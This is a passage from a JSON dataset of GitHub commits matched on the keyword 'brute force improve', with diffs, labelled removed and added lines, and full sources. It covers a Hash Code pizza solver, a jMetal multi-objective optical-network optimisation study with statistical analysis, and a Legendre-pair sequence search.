Pizza(ingredients=ingredients)\n\n    def _powerset(self, iterable):\n        \"powerset([1,2,3]) --> () (1,) (2,) (3,) (1,2) (1,3) (2,3) (1,2,3)\"\n        s = list(iterable)\n        return chain.from_iterable(combinations(s, r) for r in range(len(s) + 1))\n"},"\/hashcode22\/main.py":{"changes":[{"diff":"\n from hashcode22.algorithms.brute_force import BruteForceAlgorithm\n from file_parser import FileParser\n+from hashcode22.output_writer import OutputWriter\n from problem import Problem\n \n \n def main(problem):\n     solution = BruteForceAlgorithm().solve(problem=problem)\n-    print(solution)\n+    OutputWriter().write(solution, \"test.txt\")\n \n \n if __name__ == \"__main","add":2,"remove":1,"filename":"\/hashcode22\/main.py","badparts":["    print(solution)"],"goodparts":["from hashcode22.output_writer import OutputWriter","    OutputWriter().write(solution, \"test.txt\")"]}],"source":"\nfrom hashcode22.algorithms.brute_force import BruteForceAlgorithm from file_parser import FileParser from problem import Problem def main(problem): solution=BruteForceAlgorithm().solve(problem=problem) print(solution) if __name__==\"__main__\": input_file=\"data\/a_an_example.in.txt\" file_parser=FileParser() clients=file_parser.parse(input_file) problem=Problem(clients=clients) main(problem=problem) ","sourceWithComments":"from hashcode22.algorithms.brute_force import BruteForceAlgorithm\nfrom file_parser import FileParser\nfrom problem import Problem\n\n\ndef main(problem):\n    solution = BruteForceAlgorithm().solve(problem=problem)\n    print(solution)\n\n\nif __name__ == \"__main__\":\n    input_file = \"data\/a_an_example.in.txt\"\n    file_parser = FileParser()\n    clients = file_parser.parse(input_file)\n    problem = Problem(clients=clients)\n    main(problem=problem)\n"}},"msg":"improve on brute force"}},"https:\/\/github.com\/ASdOliveira\/OTN_Mastering":{"6d14f316b15bf51ea61e1d41d08387d3eea86361":{"url":"https:\/\/api.github.com\/repos\/ASdOliveira\/OTN_Mastering\/commits\/6d14f316b15bf51ea61e1d41d08387d3eea86361","html_url":"https:\/\/github.com\/ASdOliveira\/OTN_Mastering\/commit\/6d14f316b15bf51ea61e1d41d08387d3eea86361","message":"Improving brute force algorithm","sha":"6d14f316b15bf51ea61e1d41d08387d3eea86361","keyword":"brute force improve","diff":"diff --git a\/Brute force.py b\/Brute force.py\nindex dfef350..e93664c 100644\n--- a\/Brute force.py\t\n+++ b\/Brute force.py\t\n@@ -9,10 +9,10 @@\n \n from Utils.Log import Log\n \n+fileName = 'AllResults'\n startTime = timeit.default_timer()\n \n-ResultLog = Log(\"AllResults\")\n-# pfLog = Log(\"ParetoFront\")\n+ResultLog = Log(fileName)\n \n minimumValue = 0\n maximumValue = 8\n@@ -23,8 +23,6 @@\n \n print(\"Starting...\")\n \n-# SOLUTION = Solution(number_of_variables=7, number_of_objectives=2)\n-\n Net = Network(folderName=\"Topologia1\")\n allPossibilities = list(map(list, product(range(minimumValue, maximumValue + 1), repeat=sizeOfLinkBundles)))\n \n@@ -33,23 +31,92 @@\n \n     result = evaluateNetwork(Net, individual)\n     if not result[1] >= 1.1:\n-        # SOLUTION = Solution(number_of_variables=7, number_of_objectives=2)\n-        # SOLUTION.objectives.append(result)\n-        # SOLUTION.variables.append(individual)\n-        # solutions.append(SOLUTION)\n \n         ResultLog.log(result)\n     iterationNumber += 1\n \n ResultLog.save()\n \n-# SOL = get_non_dominated_solutions(solutions)\n-# pfLog.log(SOL)\n-# pfLog.save()\n-\n-# plot_front = Plot(title='Pareto front approximation', axis_labels=['Interfaces', 'TIRF'])\n-# plot_front.plot(SOL, label='BruteForce - OTN')\n-\n stopTime = timeit.default_timer()\n \n print('Execution Time:', stopTime - startTime)\n+\n+with open(fileName + '.txt') as f:\n+    lines = f.readlines()\n+\n+solution_list = []\n+count = 0\n+for line in lines:\n+    print('loading file, percentage: \\t' + str(round(float(count\/len(lines) * 100), 2)))\n+    solution = Solution(number_of_variables=7, number_of_objectives=2)\n+    result = eval(line)\n+    solution.objectives[0] = result[0]\n+    solution.objectives[1] = result[1]\n+    solution_list.append(solution)\n+    count += 1\n+\n+print('Obtaining the pareto front')\n+pareto_front = get_non_dominated_solutions(solution_list)\n+\n+with open('Paretofront.pf', 'w') as f:\n+    for pareto in pareto_front:\n+        f.write(str(pareto.objectives))\n+        f.write('\\n')\n+\n+plot_front = Plot(title='Pareto front approximation', axis_labels=['Interfaces', 'TIRF'])\n+plot_front.plot(pareto_front, label='NSGAII-OTN')\n+\n+# ------------------------Saving multithread implementation ----------------\n+# from jmetal.core.solution import Solution\n+# from jmetal.lab.visualization import Plot\n+# from jmetal.util.solution import get_non_dominated_solutions\n+#\n+# from Models.Network import Network\n+# from Problem.Evaluation import evaluateNetwork\n+# import timeit\n+# from itertools import product\n+#\n+# from Utils.Log import Log\n+# import multiprocessing as mp\n+#\n+# startTime = timeit.default_timer()\n+#\n+# ResultLog = Log(\"AllResults\")\n+# # pfLog = Log(\"ParetoFront\")\n+#\n+# minimumValue = 0\n+# maximumValue = 8\n+# sizeOfLinkBundles = 7\n+#\n+# solutions = []\n+# iterationNumber = 0\n+# allPossibilities = list(map(list, product(range(minimumValue, maximumValue + 1), repeat=sizeOfLinkBundles)))\n+#\n+#\n+# def evaluate(Net, chromossome):\n+#     global iterationNumber\n+#     result = evaluateNetwork(Net, chromossome)\n+#     if not result[1] >= 1.1:\n+#         ResultLog.log(result)\n+#\n+#     iterationNumber += 1\n+#\n+#     print(\"Iteration Number: \" + str(iterationNumber) + \"\\tpercentage: \" + str(\n+#         round(float(iterationNumber \/ len(allPossibilities) * 100), 2)))\n+#\n+#     return result\n+#\n+# print(\"Starting...\")\n+# pool = mp.Pool(mp.cpu_count())\n+# print(mp.cpu_count())\n+#\n+# Net = Network(folderName=\"Topologia1\")\n+#\n+# results = [pool.apply(evaluate, args=(Net, onePossibility)) for onePossibility in allPossibilities]\n+#\n+# pool.close()\n+# ResultLog.save()\n+#\n+# stopTime = timeit.default_timer()\n+#\n+# print('Execution Time:', stopTime - startTime)\ndiff --git a\/Experiments.py b\/Experiments.py\nindex 268bd8d..4896bbe 100644\n--- a\/Experiments.py\n+++ b\/Experiments.py\n@@ -93,7 +93,7 @@ def configure_experiment(problems: dict, n_run: int):\n                     algorithm=MOCell(\n                         problem=problem,\n                         population_size=20,\n-                        neighborhood=C9(10, 10),\n+                        neighborhood=C9(4, 4),\n                         archive=CrowdingDistanceArchive(100),\n                         mutation=IntegerPolynomialMutation(probability=0.05, distribution_index=20),\n                         crossover=IntegerSBXCrossover(probability=0.3, distribution_index=20),\ndiff --git a\/StatisticalAnalysis.py b\/StatisticalAnalysis.py\nindex 3463836..1231941 100644\n--- a\/StatisticalAnalysis.py\n+++ b\/StatisticalAnalysis.py\n@@ -16,11 +16,17 @@\n     # Statistical lab\n \n     avg = compute_mean_indicator(filename='QualityIndicatorSummary.csv', indicator_name='HV')\n+    print('------------Hypervolume average----------------')\n     print(avg)\n \n     # Non-parametric test\n     print('-------- Sign Test --------')\n+    print(sign_test(avg[['NSGAII', 'MOCELL']]))\n+    print('-------- Sign Test --------')\n     print(sign_test(avg[['NSGAII', 'HYPE']]))\n+    print('-------- Sign Test --------')\n+    print(sign_test(avg[['NSGAII', 'SPEA2']]))\n+\n     print('-------- Friedman Test --------')\n     print(friedman_test(avg))\n     print('-------- Friedman Aligned Rank Test --------')\n@@ -34,11 +40,13 @@\n     print('z values \\n', z)\n     print('p-values \\n', p_val)\n     print('adjusted p-values \\n', adj_pval)\n+\n     print('-------- Friedman Aligned Rank Post-Hoc Test --------')\n     z, p_val, adj_pval = friedman_aligned_ph_test(avg, apv_procedure='Shaffer')\n     print('z values \\n', z)\n     print('p-values \\n', p_val)\n     print('adjusted p-values \\n', adj_pval)\n+\n     print('-------- QuadeTest Post-Hoc Test --------')\n     z, p_val, adj_pval = quade_ph_test(avg, apv_procedure='Holm')\n     print('z values \\n', z)\n@@ -47,7 +55,7 @@\n \n     # Plot critical distance\n \n-    CDplot(avg.T, alpha=0.15, higher_is_better=True)\n+    # CDplot(avg.T, alpha=0.15, higher_is_better=True)\n \n     print('-------- Bayesian Sign Test --------')\n     bst, DProcess = bayesian_sign_test(avg[['NSGAII', 'HYPE']], rope_limits=[-0.002, 0.002],\n","files":{"\/Brute force.py":{"changes":[{"diff":"\n \n from Utils.Log import Log\n \n+fileName = 'AllResults'\n startTime = timeit.default_timer()\n \n-ResultLog = Log(\"AllResults\")\n-# pfLog = Log(\"ParetoFront\")\n+ResultLog = Log(fileName)\n \n minimumValue = 0\n maximumValue = 8\n","add":2,"remove":2,"filename":"\/Brute force.py","badparts":["ResultLog = Log(\"AllResults\")"],"goodparts":["fileName = 'AllResults'","ResultLog = Log(fileName)"]}],"source":"\nfrom jmetal.core.solution import Solution from jmetal.lab.visualization import Plot from jmetal.util.solution import get_non_dominated_solutions from Models.Network import Network from Problem.Evaluation import evaluateNetwork import timeit from itertools import product from Utils.Log import Log startTime=timeit.default_timer() ResultLog=Log(\"AllResults\") minimumValue=0 maximumValue=8 sizeOfLinkBundles=7 solutions=[] iterationNumber=0 print(\"Starting...\") Net=Network(folderName=\"Topologia1\") allPossibilities=list(map(list, product(range(minimumValue, maximumValue +1), repeat=sizeOfLinkBundles))) for individual in allPossibilities: print(\"Iteration Number: \" +str(iterationNumber) +\"\\tpercentage: \" +str(round(float(iterationNumber\/len(allPossibilities) * 100), 2))) result=evaluateNetwork(Net, individual) if not result[1] >=1.1: ResultLog.log(result) iterationNumber +=1 ResultLog.save() stopTime=timeit.default_timer() print('Execution Time:', stopTime -startTime) ","sourceWithComments":"from jmetal.core.solution import Solution\nfrom jmetal.lab.visualization import Plot\nfrom jmetal.util.solution import get_non_dominated_solutions\n\nfrom Models.Network import Network\nfrom Problem.Evaluation import evaluateNetwork\nimport timeit\nfrom itertools import product\n\nfrom Utils.Log import Log\n\nstartTime = timeit.default_timer()\n\nResultLog = Log(\"AllResults\")\n# pfLog = Log(\"ParetoFront\")\n\nminimumValue = 0\nmaximumValue = 8\nsizeOfLinkBundles = 7\n\nsolutions = []\niterationNumber = 0\n\nprint(\"Starting...\")\n\n# SOLUTION = Solution(number_of_variables=7, number_of_objectives=2)\n\nNet = Network(folderName=\"Topologia1\")\nallPossibilities = list(map(list, product(range(minimumValue, maximumValue + 1), repeat=sizeOfLinkBundles)))\n\nfor individual in allPossibilities:\n    print(\"Iteration Number: \" + str(iterationNumber) + \"\\tpercentage: \" + str(round(float(iterationNumber\/len(allPossibilities) * 100), 2)))\n\n    result = evaluateNetwork(Net, individual)\n    if not result[1] >= 1.1:\n        # SOLUTION = Solution(number_of_variables=7, number_of_objectives=2)\n        # SOLUTION.objectives.append(result)\n        # SOLUTION.variables.append(individual)\n        # solutions.append(SOLUTION)\n\n        ResultLog.log(result)\n    iterationNumber += 1\n\nResultLog.save()\n\n# SOL = get_non_dominated_solutions(solutions)\n# pfLog.log(SOL)\n# pfLog.save()\n\n# plot_front = Plot(title='Pareto front approximation', axis_labels=['Interfaces', 'TIRF'])\n# plot_front.plot(SOL, label='BruteForce - OTN')\n\nstopTime = timeit.default_timer()\n\nprint('Execution Time:', stopTime - startTime)\n"},"\/Experiments.py":{"changes":[{"diff":"\n                     algorithm=MOCell(\n                         problem=problem,\n                         population_size=20,\n-                        neighborhood=C9(10, 10),\n+                        neighborhood=C9(4, 4),\n                         archive=CrowdingDistanceArchive(100),\n                         mutation=IntegerPolynomialMutation(probability=0.05, distribution_index=20),\n                         crossover=IntegerSBXCrossover(probability=0.3, distribution_index=20)","add":1,"remove":1,"filename":"\/Experiments.py","badparts":["                        neighborhood=C9(10, 10),"],"goodparts":["                        neighborhood=C9(4, 4),"]}],"source":"\nfrom jmetal.algorithm.multiobjective import SPEA2, HYPE, SMPSO, MOCell from jmetal.algorithm.multiobjective.nsgaii import NSGAII from jmetal.core.quality_indicator import GenerationalDistance, EpsilonIndicator, HyperVolume, \\ InvertedGenerationalDistance from jmetal.core.solution import IntegerSolution from jmetal.operator import IntegerPolynomialMutation from jmetal.operator.crossover import IntegerSBXCrossover from jmetal.util.archive import CrowdingDistanceArchive from jmetal.util.neighborhood import C9 from jmetal.util.termination_criterion import StoppingByEvaluations import Utils from Models.Network import Network import timeit from Problem.CustomStopCriterion import StoppingByEvaluationsCustom from Problem.ProblemWrapper import OTNProblem from jmetal.lab.experiment import Experiment, Job, generate_summary_from_experiment from Utils import Filter startTime=timeit.default_timer() BestTirf=[] BestInterfaceQuantity=[] solutionsResult=[] frontResult=0 max_evaluations=2000 Net=Network(folderName=\"Topologia1\") problemOTN=OTNProblem(Net, len(Net.LinkBundles)) stopCriterion=StoppingByEvaluationsCustom(max_evaluations,[200, 2.1]) reference_point=IntegerSolution([0],[8], problemOTN.number_of_objectives,) reference_point.objectives=[200, 2.1] def configure_experiment(problems: dict, n_run: int): jobs=[] for run in range(n_run): for problem_tag, problem in problems.items(): jobs.append( Job( algorithm=NSGAII( problem=problem, population_size=20, offspring_population_size=20, mutation=IntegerPolynomialMutation(probability=0.05, distribution_index=20), crossover=IntegerSBXCrossover(probability=0.3, distribution_index=20), termination_criterion=StoppingByEvaluations(max_evaluations=max_evaluations) ), algorithm_tag='NSGAII', problem_tag=problem_tag, run=run, ) ) jobs.append( Job( algorithm=SPEA2( problem=problem, population_size=20, offspring_population_size=20, mutation=IntegerPolynomialMutation(probability=0.05, distribution_index=20), crossover=IntegerSBXCrossover(probability=0.3, distribution_index=20), termination_criterion=StoppingByEvaluations(max_evaluations=max_evaluations) ), algorithm_tag='SPEA2', problem_tag=problem_tag, run=run, ) ) jobs.append( Job( algorithm=HYPE( problem=problem, reference_point=reference_point, population_size=20, offspring_population_size=20, mutation=IntegerPolynomialMutation(probability=0.05, distribution_index=20), crossover=IntegerSBXCrossover(probability=0.3, distribution_index=20), termination_criterion=StoppingByEvaluations(max_evaluations=max_evaluations) ), algorithm_tag='HYPE', problem_tag=problem_tag, run=run, ) ) jobs.append( Job( algorithm=MOCell( problem=problem, population_size=20, neighborhood=C9(10, 10), archive=CrowdingDistanceArchive(100), mutation=IntegerPolynomialMutation(probability=0.05, distribution_index=20), crossover=IntegerSBXCrossover(probability=0.3, distribution_index=20), termination_criterion=StoppingByEvaluations(max_evaluations=max_evaluations) ), algorithm_tag='MOCELL', problem_tag=problem_tag, run=run, ) ) return jobs if __name__=='__main__': jobs=configure_experiment(problems={'OTN': problemOTN}, n_run=30) output_directory='data' experiment=Experiment(output_dir=output_directory, jobs=jobs) experiment.run() Filter.RemovePenalty(output_directory) generate_summary_from_experiment( input_dir=output_directory, reference_fronts='C:\\\\Users\\\\aryss\\\\Documents\\\\Repositories\\\\OTN_Mastering\\\\Output\\\\CT1\\\\8 services', quality_indicators=[InvertedGenerationalDistance(), EpsilonIndicator(), HyperVolume([200, 2.1])] ) ","sourceWithComments":"from jmetal.algorithm.multiobjective import SPEA2, HYPE, SMPSO, MOCell\nfrom jmetal.algorithm.multiobjective.nsgaii import NSGAII\nfrom jmetal.core.quality_indicator import GenerationalDistance, EpsilonIndicator, HyperVolume, \\\n    InvertedGenerationalDistance\nfrom jmetal.core.solution import IntegerSolution\nfrom jmetal.operator import IntegerPolynomialMutation\nfrom jmetal.operator.crossover import IntegerSBXCrossover\nfrom jmetal.util.archive import CrowdingDistanceArchive\nfrom jmetal.util.neighborhood import C9\nfrom jmetal.util.termination_criterion import StoppingByEvaluations\n\nimport Utils\nfrom Models.Network import Network\nimport timeit\n\nfrom Problem.CustomStopCriterion import StoppingByEvaluationsCustom\nfrom Problem.ProblemWrapper import OTNProblem\n\nfrom jmetal.lab.experiment import Experiment, Job, generate_summary_from_experiment\n\nfrom Utils import Filter\n\nstartTime = timeit.default_timer()\n\nBestTirf = []\nBestInterfaceQuantity = []\nsolutionsResult = []\nfrontResult = 0\n\nmax_evaluations = 2000\nNet = Network(folderName=\"Topologia1\")\nproblemOTN = OTNProblem(Net, len(Net.LinkBundles))\nstopCriterion = StoppingByEvaluationsCustom(max_evaluations, [200, 2.1])  # To topology 1, 200 is enough\n\nreference_point = IntegerSolution([0], [8], problemOTN.number_of_objectives, )\nreference_point.objectives = [200, 2.1]  # Mandatory for HYPE\n\n\ndef configure_experiment(problems: dict, n_run: int):\n    jobs = []\n\n    for run in range(n_run):\n        for problem_tag, problem in problems.items():\n            jobs.append(\n                Job(\n                    algorithm=NSGAII(\n                        problem=problem,\n                        population_size=20,\n                        offspring_population_size=20,\n                        mutation=IntegerPolynomialMutation(probability=0.05, distribution_index=20),\n                        crossover=IntegerSBXCrossover(probability=0.3, distribution_index=20),\n                        termination_criterion=StoppingByEvaluations(max_evaluations=max_evaluations)\n                        # termination_criterion=stopCriterion\n                    ),\n                    algorithm_tag='NSGAII',\n                    problem_tag=problem_tag,\n                    run=run,\n                )\n            )\n            jobs.append(\n                Job(\n                    algorithm=SPEA2(\n                        problem=problem,\n                        population_size=20,\n                        offspring_population_size=20,\n                        mutation=IntegerPolynomialMutation(probability=0.05, distribution_index=20),\n                        crossover=IntegerSBXCrossover(probability=0.3, distribution_index=20),\n                        termination_criterion=StoppingByEvaluations(max_evaluations=max_evaluations)\n                    ),\n                    algorithm_tag='SPEA2',\n                    problem_tag=problem_tag,\n                    run=run,\n                )\n            )\n            jobs.append(\n                Job(\n                    algorithm=HYPE(\n                        problem=problem,\n                        reference_point=reference_point,\n                        population_size=20,\n                        offspring_population_size=20,\n                        mutation=IntegerPolynomialMutation(probability=0.05, distribution_index=20),\n                        crossover=IntegerSBXCrossover(probability=0.3, distribution_index=20),\n                        termination_criterion=StoppingByEvaluations(max_evaluations=max_evaluations)\n                    ),\n                    algorithm_tag='HYPE',\n                    problem_tag=problem_tag,\n                    run=run,\n                )\n            )\n            jobs.append(\n                Job(\n                    algorithm=MOCell(\n                        problem=problem,\n                        population_size=20,\n                        neighborhood=C9(10, 10),\n                        archive=CrowdingDistanceArchive(100),\n                        mutation=IntegerPolynomialMutation(probability=0.05, distribution_index=20),\n                        crossover=IntegerSBXCrossover(probability=0.3, distribution_index=20),\n                        termination_criterion=StoppingByEvaluations(max_evaluations=max_evaluations)\n                    ),\n                    algorithm_tag='MOCELL',\n                    problem_tag=problem_tag,\n                    run=run,\n                )\n            )\n    return jobs\n\n\nif __name__ == '__main__':\n    # Configure the experiments\n    jobs = configure_experiment(problems={'OTN': problemOTN}, n_run=30)\n\n    # Run the study\n    output_directory = 'data'\n    experiment = Experiment(output_dir=output_directory, jobs=jobs)\n    experiment.run()\n\n    Filter.RemovePenalty(output_directory)\n\n    # Reference fronts is the folder where is the reference to be compared with.\n    generate_summary_from_experiment(\n        input_dir=output_directory,\n        reference_fronts='C:\\\\Users\\\\aryss\\\\Documents\\\\Repositories\\\\OTN_Mastering\\\\Output\\\\CT1\\\\8 services',\n        quality_indicators=[InvertedGenerationalDistance(), EpsilonIndicator(), HyperVolume([200, 2.1])]\n    )\n"},"\/StatisticalAnalysis.py":{"changes":[{"diff":" \n     # Plot critical distance\n \n-    CDplot(avg.T, alpha=0.15, higher_is_better=True)\n+    # CDplot(avg.T, alpha=0.15, higher_is_better=True)\n \n     print('-------- Bayesian Sign Test --------')\n     bst, DProcess = bayesian_sign_test(avg[['NSGAII', 'HYPE']], rope_limits=[-0.002, 0.002],\n","add":1,"remove":1,"filename":"\/StatisticalAnalysis.py","badparts":["    CDplot(avg.T, alpha=0.15, higher_is_better=True)"],"goodparts":[]}],"source":"\nfrom jmetal.lab.experiment import generate_boxplot, generate_latex_tables, compute_mean_indicator, compute_wilcoxon from jmetal.lab.statistical_test.bayesian import * from jmetal.lab.statistical_test.functions import * from jmetal.lab.visualization import CDplot, plot_posterior if __name__=='__main__': generate_latex_tables(filename='QualityIndicatorSummary.csv') generate_boxplot(filename='QualityIndicatorSummary.csv') compute_wilcoxon(filename='QualityIndicatorSummary.csv') avg=compute_mean_indicator(filename='QualityIndicatorSummary.csv', indicator_name='HV') print(avg) print('--------Sign Test --------') print(sign_test(avg[['NSGAII', 'HYPE']])) print('--------Friedman Test --------') print(friedman_test(avg)) print('--------Friedman Aligned Rank Test --------') print(friedman_aligned_rank_test(avg)) print('--------Quade Test --------') print(quade_test(avg)) print('--------Friedman Post-Hoc Test --------') z, p_val, adj_pval=friedman_ph_test(avg, control=0, apv_procedure='Bonferroni') print('z values \\n', z) print('p-values \\n', p_val) print('adjusted p-values \\n', adj_pval) print('--------Friedman Aligned Rank Post-Hoc Test --------') z, p_val, adj_pval=friedman_aligned_ph_test(avg, apv_procedure='Shaffer') print('z values \\n', z) print('p-values \\n', p_val) print('adjusted p-values \\n', adj_pval) print('--------QuadeTest Post-Hoc Test --------') z, p_val, adj_pval=quade_ph_test(avg, apv_procedure='Holm') print('z values \\n', z) print('p-values \\n', p_val) print('adjusted p-values \\n', adj_pval) CDplot(avg.T, alpha=0.15, higher_is_better=True) print('--------Bayesian Sign Test --------') bst, DProcess=bayesian_sign_test(avg[['NSGAII', 'HYPE']], rope_limits=[-0.002, 0.002], prior_strength=0.5, return_sample=True) plot_posterior(DProcess, higher_is_better=True, alg_names=['NSGAII', 'HYPE']) print('Pr(NSGAII < HYPE)=%.3f' % bst[0]) print('Pr(NSGAII ~=HYPE)=%.3f' % bst[1]) print('Pr(NSGAII > HYPE)=%.3f' % bst[2]) print('--------Bayesian Signed Rank Test --------') bst, DProcess=bayesian_signed_rank_test(avg[['NSGAII', 'HYPE']], rope_limits=[-0.002, 0.002], prior_strength=0.5, return_sample=True) plot_posterior(DProcess, higher_is_better=True, alg_names=['NSGAII', 'HYPE']) print('Pr(NSGAII < HYPE)=%.3f' % bst[0]) print('Pr(NSGAII ~=HYPE)=%.3f' % bst[1]) print('Pr(NSGAII > HYPE)=%.3f' % bst[2]) ","sourceWithComments":"from jmetal.lab.experiment import generate_boxplot, generate_latex_tables, compute_mean_indicator, compute_wilcoxon\nfrom jmetal.lab.statistical_test.bayesian import *\nfrom jmetal.lab.statistical_test.functions import *\nfrom jmetal.lab.visualization import CDplot, plot_posterior\n\nif __name__ == '__main__':\n    # Generate Median & IQR tables\n    generate_latex_tables(filename='QualityIndicatorSummary.csv')\n\n    # Generate boxplots\n    generate_boxplot(filename='QualityIndicatorSummary.csv')\n\n    # Wilcoxon\n    compute_wilcoxon(filename='QualityIndicatorSummary.csv')\n\n    # Statistical lab\n\n    avg = compute_mean_indicator(filename='QualityIndicatorSummary.csv', indicator_name='HV')\n    print(avg)\n\n    # Non-parametric test\n    print('-------- Sign Test --------')\n    print(sign_test(avg[['NSGAII', 'HYPE']]))\n    print('-------- Friedman Test --------')\n    print(friedman_test(avg))\n    print('-------- Friedman Aligned Rank Test --------')\n    print(friedman_aligned_rank_test(avg))\n    print('-------- Quade Test --------')\n    print(quade_test(avg))\n\n    # Post-hoc tests\n    print('-------- Friedman Post-Hoc Test --------')\n    z, p_val, adj_pval = friedman_ph_test(avg, control=0, apv_procedure='Bonferroni')\n    print('z values \\n', z)\n    print('p-values \\n', p_val)\n    print('adjusted p-values \\n', adj_pval)\n    print('-------- Friedman Aligned Rank Post-Hoc Test --------')\n    z, p_val, adj_pval = friedman_aligned_ph_test(avg, apv_procedure='Shaffer')\n    print('z values \\n', z)\n    print('p-values \\n', p_val)\n    print('adjusted p-values \\n', adj_pval)\n    print('-------- QuadeTest Post-Hoc Test --------')\n    z, p_val, adj_pval = quade_ph_test(avg, apv_procedure='Holm')\n    print('z values \\n', z)\n    print('p-values \\n', p_val)\n    print('adjusted p-values \\n', adj_pval)\n\n    # Plot critical distance\n\n    CDplot(avg.T, alpha=0.15, higher_is_better=True)\n\n    print('-------- Bayesian Sign Test --------')\n    bst, DProcess = bayesian_sign_test(avg[['NSGAII', 'HYPE']], rope_limits=[-0.002, 0.002],\n                                       prior_strength=0.5, return_sample=True)\n    plot_posterior(DProcess, higher_is_better=True, alg_names=['NSGAII', 'HYPE'])\n\n    print('Pr(NSGAII < HYPE) = %.3f' % bst[0])\n    print('Pr(NSGAII ~= HYPE) = %.3f' % bst[1])\n    print('Pr(NSGAII > HYPE) = %.3f' % bst[2])\n\n    print('-------- Bayesian Signed Rank Test --------')\n    bst, DProcess = bayesian_signed_rank_test(avg[['NSGAII', 'HYPE']], rope_limits=[-0.002, 0.002],\n                                              prior_strength=0.5, return_sample=True)\n    plot_posterior(DProcess, higher_is_better=True, alg_names=['NSGAII', 'HYPE'])\n\n    print('Pr(NSGAII < HYPE) = %.3f' % bst[0])\n    print('Pr(NSGAII ~= HYPE) = %.3f' % bst[1])\n    print('Pr(NSGAII > HYPE) = %.3f' % bst[2])"}},"msg":"Improving brute force algorithm"}},"https:\/\/github.com\/prangel-git\/legendre_pairs_py":{"bfa745e6ffb210e2ad9254cc9f7513290505b578":{"url":"https:\/\/api.github.com\/repos\/prangel-git\/legendre_pairs_py\/commits\/bfa745e6ffb210e2ad9254cc9f7513290505b578","html_url":"https:\/\/github.com\/prangel-git\/legendre_pairs_py\/commit\/bfa745e6ffb210e2ad9254cc9f7513290505b578","message":"improved but still not great brute force search","sha":"bfa745e6ffb210e2ad9254cc9f7513290505b578","keyword":"brute force improve","diff":"diff --git a\/legendre_pairs.py b\/legendre_pairs.py\nindex d0f8729..d5bebae 100644\n--- a\/legendre_pairs.py\n+++ b\/legendre_pairs.py\n@@ -24,22 +24,6 @@ def are_compatible_psd(a, b):\n \n \n def brute_force_search_of_compatible_autocorrelations(n):\n-    sequences_to_test = [\n-        seq for seq in seq_module_rotation_and_reversal(seq_n_choose_k(n, n \/\/ 2))\n-    ]\n-\n-    compatible_sequences = []\n-    for seq_a in sequences_to_test:\n-        for seq_b in sequences_to_test:\n-            if are_compatible_autocorrelation(seq_a, seq_b):\n-                compatible_sequence = (seq_a, seq_b)\n-                compatible_sequences.append(compatible_sequence)\n-\n-    return compatible_sequences\n-\n-\n-\"\"\"\n-def brute_force_search_of_compatible_autocorrelations_1(n):\n \n     correlation_to_sequence = {\n         tuple(circular_correlation(seq, seq)): seq\n@@ -47,7 +31,7 @@ def brute_force_search_of_compatible_autocorrelations_1(n):\n     }\n \n     compatible_sequences = []\n-    expected_addition = [n - 1] + [(n - 1) \/\/ 2] * (n - 1)\n+    expected_addition = [n - 1] + [(n - 1) \/\/ 2 - 1] * (n - 1)\n     for correlation in correlation_to_sequence.keys():\n         expected_correlation = tuple(\n             pointwise_operation(lambda x, y: x - y, expected_addition, correlation)\n@@ -60,12 +44,11 @@ def brute_force_search_of_compatible_autocorrelations_1(n):\n             compatible_sequences.append(compatible_sequence)\n \n     return compatible_sequences\n-\"\"\"\n \n \n def main():  # pragma: no cover\n     print(\"Entry point for playing around\")\n-    n = 11\n+    n = 21\n     compatible_sequences = brute_force_search_of_compatible_autocorrelations(n)\n     for a, b in compatible_sequences:\n         correlation_a = circular_correlation(a, a)\n","files":{"\/legendre_pairs.py":{"changes":[{"diff":"\n \n \n def brute_force_search_of_compatible_autocorrelations(n):\n-    sequences_to_test = [\n-        seq for seq in seq_module_rotation_and_reversal(seq_n_choose_k(n, n \/\/ 2))\n-    ]\n-\n-    compatible_sequences = []\n-    for seq_a in sequences_to_test:\n-        for seq_b in sequences_to_test:\n-            if are_compatible_autocorrelation(seq_a, seq_b):\n-                compatible_sequence = (seq_a, seq_b)\n-                compatible_sequences.append(compatible_sequence)\n-\n-    return compatible_sequences\n-\n-\n-\"\"\"\n-def brute_force_search_of_compatible_autocorrelations_1(n):\n \n     correlation_to_sequence = {\n         tuple(circular_correlation(seq, seq)): seq\n","add":0,"remove":16,"filename":"\/legendre_pairs.py","badparts":["    sequences_to_test = [","        seq for seq in seq_module_rotation_and_reversal(seq_n_choose_k(n, n \/\/ 2))","    ]","    compatible_sequences = []","    for seq_a in sequences_to_test:","        for seq_b in sequences_to_test:","            if are_compatible_autocorrelation(seq_a, seq_b):","                compatible_sequence = (seq_a, seq_b)","                compatible_sequences.append(compatible_sequence)","    return compatible_sequences","\"\"\"","def brute_force_search_of_compatible_autocorrelations_1(n):"],"goodparts":[]},{"diff":"\n     }\n \n     compatible_sequences = []\n-    expected_addition = [n - 1] + [(n - 1) \/\/ 2] * (n - 1)\n+    expected_addition = [n - 1] + [(n - 1) \/\/ 2 - 1] * (n - 1)\n     for correlation in correlation_to_sequence.keys():\n         expected_correlation = tuple(\n             pointwise_operation(lambda x, y: x - y, expected_addition, correlation)\n","add":1,"remove":1,"filename":"\/legendre_pairs.py","badparts":["    expected_addition = [n - 1] + [(n - 1) \/\/ 2] * (n - 1)"],"goodparts":["    expected_addition = [n - 1] + [(n - 1) \/\/ 2 - 1] * (n - 1)"]},{"diff":"\n             compatible_sequences.append(compatible_sequence)\n \n     return compatible_sequences\n-\"\"\"\n \n \n def main():  # pragma: no cover\n     print(\"Entry point for playing around\")\n-    n = 11\n+    n = 21\n     compatible_sequences = brute_force_search_of_compatible_autocorrelations(n)\n     for a, b in compatible_sequences:\n         correlation_a = circular_correlation(a, a)\n","add":1,"remove":2,"filename":"\/legendre_pairs.py","badparts":["\"\"\"","    n = 11"],"goodparts":["    n = 21"]}],"source":"\nfrom dft_utils import psd from sequence_generation import( seq_module_rotation_and_reversal, seq_binary, seq_n_choose_k, ) from vector_utils import circular_correlation, pointwise_operation def are_compatible_autocorrelation(a, b): correlation_a=circular_correlation(a, a) correlation_b=circular_correlation(b, b) result=pointwise_operation(lambda x, y: x +y, correlation_a, correlation_b) return all([result[1]==result[i] for i in range(1, len(result))]) def are_compatible_psd(a, b): psd_a=psd(a) psd_b=psd(b) result=pointwise_operation(lambda x, y: x +y, psd_a, psd_b) are_almost_equal=lambda x, y: abs(x -y) < 1e-10 return all([are_almost_equal(result[1], result[i]) for i in range(1, len(result))]) def brute_force_search_of_compatible_autocorrelations(n): sequences_to_test=[ seq for seq in seq_module_rotation_and_reversal(seq_n_choose_k(n, n \/\/ 2)) ] compatible_sequences=[] for seq_a in sequences_to_test: for seq_b in sequences_to_test: if 